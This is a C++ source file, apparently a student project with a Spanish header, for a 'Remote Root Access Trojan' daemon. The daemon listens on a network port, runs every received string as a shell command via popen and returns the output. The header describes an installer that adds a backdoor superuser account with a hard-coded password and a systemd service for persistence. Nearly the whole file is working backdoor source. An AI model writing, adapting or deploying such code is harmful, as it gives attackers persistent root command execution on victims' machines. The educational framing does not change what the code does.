/*
    RRAT: Remote Root Access Trojan
    
    Demon: Viene del nombre "daemon", que en
        el mundo de la informática se refiere
        a procesos que se ejecutan de fondo,
        normalmente drivers u otros servicios.

    Este programa espera instrucciones del atacante,
    que usará la aplicación "Ogey" para enviar comandos.
    Esos comandos serán ejecutados por Demon.

    ------------------------------------------------
    Ejecución:
        - Automático (systemd): Un servicio de Systemd
            se carga al iniciar el ordenador, esto es
            gracias al script des-troy-r.sh, el programa
            con accesos de superusuario que instala este
            daemon y el servicio.

    Función:
        1. Esperar a ser enviado un "ogey" desde un
            ordenador ejecutando el programa ogey, para
            comprobar la conexión, el daemon enviará un
            "rrat" de vuelta

        2. Ogey ahora se conectará por SSH al usuario
            "ogeyrratdemonuser" con la contraseña
            "ilovecookies". Este usuario fue creado
            por des-troy-r.sh y tiene privilegios
            de superusuario

        3. Ahora, este programa simplemente esperará
            a que Ogey le mande comandos y los ejecutará

    ________________________________________________
    Sistemas Informáticos - 1°DAW - 2024
    Por: Javier Sanz Valero
*/

// includes
#include <cstddef>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <ostream>
#include <string>

// ENet
#include <enet/enet.h>

// Global, really important
ENetHost* server;

// Function Prototypes
std::string runLinuxCommand(const std::string cmd);

void BroadcastPacket(const char* data);
bool rratReceive(ENetPacket* packet);

// main
int main() {
    // Initialize ENet
    if (enet_initialize() != 0) {
        std::cout << "An error occurred while initializing ENet.\n";
        return EXIT_FAILURE;
    }

    // We create a server now
    ENetAddress address;
    ENetEvent event;

    address.host = ENET_HOST_ANY;
    address.port = 7654; // Arbitrary

    server = enet_host_create(
        &address,
        1, // 1 Single client
        1, // 1 Single channel
        0, // Any incoming bandwidth
        0  // Any outcoming bandwidth
    );

    // oops
    if (server == NULL) {
        std::cout << "Can't create ENet server.\n";
        return EXIT_FAILURE;
    }

    // Did the client send ogey?
    bool ogey = false;

    // Main loop
    // This is a daemon AND a virus.
    // This program shouldn't end
    //
    // !!! [INFINITE LOOP INCOMING] !!!
    while (true) {
        // 1000ms of timeout, no events in 1 second = ENET_EVENT_TYPE_NONE
        while (enet_host_service(server, &event, 1000) > 0) {
            switch (event.type) {
                case ENET_EVENT_TYPE_CONNECT:
                    // The attacker connected
                    std::cout << "The Attacker is here!\n";
                    break;
                
                case ENET_EVENT_TYPE_RECEIVE:
                    // The attacker sent something
                    rratReceive(event.packet);

                    // Destroy packet
                    enet_packet_destroy(event.packet);
                    break;

                case ENET_EVENT_TYPE_DISCONNECT:
                    // The attacker left
                    std::cout << "The Attacker left\n";
                    BroadcastPacket("EMERGENCY!! USER DEATH INMINENT!");
                    event.peer->data = NULL;
                    break;

                case ENET_EVENT_TYPE_NONE:
                    // Wait lmao
                    break;
            }
        }
    }


    // Close ENet and free memory :)
    enet_host_destroy(server);
    enet_deinitialize();
}


// Function definitions
void BroadcastPacket(const char* data) {
    ENetPacket* packet = enet_packet_create(data, strlen(data) + 1, ENET_PACKET_FLAG_RELIABLE);
	enet_host_broadcast(server, 0, packet);
}

bool rratReceive(ENetPacket* packet) {
    const char* msg = (const char*)packet->data;
    // std::cout << msg << std::endl;

    // Was the message received an "ogey"?
    if (!strcmp(msg, "ogey")) {
        BroadcastPacket("rrat");
        std::cout << "Received an ogey!\n";
        return true;
    }

    // If it's not ogey, process it normally,
    // it's a command

    std::cout << "We received a command!\n";
    
    std::string output = runLinuxCommand(msg);
    BroadcastPacket(output.c_str());

    return false;
}

// Get output of linux command
std::string runLinuxCommand(const std::string cmd) {
    char buffer[256];
    std::string result = "";
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}